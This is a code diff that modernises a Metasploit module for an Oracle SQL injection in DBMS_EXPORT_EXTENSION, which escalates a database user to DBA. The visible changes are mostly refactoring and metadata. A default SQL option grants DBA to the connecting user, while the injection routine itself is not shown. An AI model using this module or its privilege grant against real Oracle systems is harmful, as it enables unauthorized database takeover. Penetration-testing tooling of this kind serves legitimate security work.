@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
       'Description'    => %q{
-        This module will escalate a Oracle DB user to DBA by exploiting an
+        This module will escalate an Oracle DB user to DBA by exploiting a
         sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
 
         Note: This module has been tested against 9i, 10gR1 and 10gR2.
@@ -27,12 +24,12 @@ class Metasploit3 < Msf::Auxiliary
           [ 'BID', '17699' ],
           [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ],
         ],
-      'DisclosureDate' => 'Apr 26 2006'))
+      'DisclosureDate' => '2006-04-26'))
 
       register_options(
         [
           OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
-        ], self.class)
+        ])
   end
 
   def run
@@ -113,5 +110,4 @@ end;
 
     # Probably should do a 'drop package #{name}'
   end
-
 end
